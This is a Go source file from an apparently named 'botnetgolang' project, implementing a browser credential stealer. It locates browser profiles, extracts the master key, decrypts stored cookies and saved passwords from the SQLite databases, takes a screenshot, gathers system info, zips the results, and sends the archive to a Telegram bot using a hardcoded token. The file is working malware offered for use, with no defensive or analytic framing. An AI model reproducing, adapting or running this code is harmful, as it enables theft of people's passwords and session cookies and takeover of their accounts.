package internal

import (
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

const (
	Cfff = ".facebook.com"
	Cggg = "google.com"
	Clll = "live.com"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
	var result model.AllProfile

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
		fmt.Print("loi")
	} else {
		for _, value := range paths {
			alls = append(alls, value)
		}

	}

	if err != nil {
		panic(err)
	}
	// lay cac profile
	result.Alls = alls
	result.PathSource = ppp
	result.UserData = pathfolderD
	result.Version = textF

	return &result
}

func MainBL(browser model.BrowserPaths) {
	allProfile := FunGetProfile(browser)

	if len(allProfile.Alls) < 0 {
		return
	}

	masterKey, err := pkg.GetMasterKey(allProfile.PathSource + browser.Local)
	fmt.Println(masterKey)
	if err != nil {
		fmt.Println("error cant get masterKey")
	}
	cookie_ok := make([]*model.Cookie, 0)
	info_ok := make([]*model.Info, 0)
	for _, profile := range allProfile.Alls {
		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
		// connect sqlite3
		connToken, err := pkg.ConnectSQLite(path)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(connToken)
		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
		listToken := token

		for _, value := range listToken {
			tmp := value["is_httponly"]
			fmt.Println(tmp)
			tokenRow := &model.Cookie{
				Domain:         value["host_key"].(string),
				ExpirationDate: float64(value["expires_utc"].(int64)) / 1000000,
				HttpOnly:       value["is_httponly"],
				Name:           value["name"].(string),
				Path:           value["path"].(string),
				Secure:         value["is_secure"],
				Value:          value["encrypted_value"].(string),
			}
			result_token := pkg.GetCookie(tokenRow, allProfile.PathSource+browser.Local, masterKey)
			if result_token != nil {
				cookie_ok = append(cookie_ok, result_token)
			}
			fmt.Println(result_token)
		}
		fmt.Println(listToken)

		path = fmt.Sprintf("%v\\Login Data", profile)
		connInfo, err := pkg.ConnectSQLite(path)
		info, _ := pkg.QueryData(connInfo, pkg.Passwords)

		//// init condition to select
		//conditions := []interface{}{
		//	_const.Cfff,
		//	_const.Cggg,
		//	_const.Clll,
		//}

		//listInfo := pkg.FilterConditions(info, conditions, "action_url")

		listInfo := info
		fmt.Println(listInfo)
		profiletmp := strings.Split(profile, "\\")
		for _, value := range listInfo {
			infoRow := &model.Info{
				Url:      value["action_url"].(string),
				UserName: value["username_value"].(string),
				Pass:     value["password_value"].(string),
				Browser:  browser.Name,
				Profile:  profiletmp[len(profiletmp)-1],
			}
			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
			if result != nil {
				info_ok = append(info_ok, result)
			}
			fmt.Println(result)
		}
	}

	fmt.Println(info_ok)
	fmt.Println(cookie_ok)

	pkg.DeleteFolderRecursive("storage")

	err = os.Mkdir("storage", 0755)
	if err != nil {
		fmt.Println(err)
		return
	}

	pkg.SnapImage()

	file_cookie, err := os.Create("./storage/cookie.json")
	defer func() {
		if err := file_cookie.Close(); err != nil {
			panic(err)
		}
	}()
	file_pass, err := os.Create("./storage/pass.json")
	defer func() {
		if err := file_pass.Close(); err != nil {
			panic(err)
		}
	}()

	encoder_cookie := json.NewEncoder(file_cookie)
	err = encoder_cookie.Encode(cookie_ok)

	encoder_pass := json.NewEncoder(file_pass)
	err = encoder_pass.Encode(info_ok)

	pkg.GetInfoOperatingSystem()
	//pkg.FormatFile("./storage/cookie.json")
	//pkg.FormatFile("./storage/pass.json")
	//pkg.FormatFile("./storage/operatingsystem.json")

	err = pkg.ZipSource("storage", "storage.zip")
	if err != nil {
		log.Fatal(err)
	}

	token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
	pkg.SendFileByBotTele(token, "storage.zip")
	//fmt.Println(test)

}
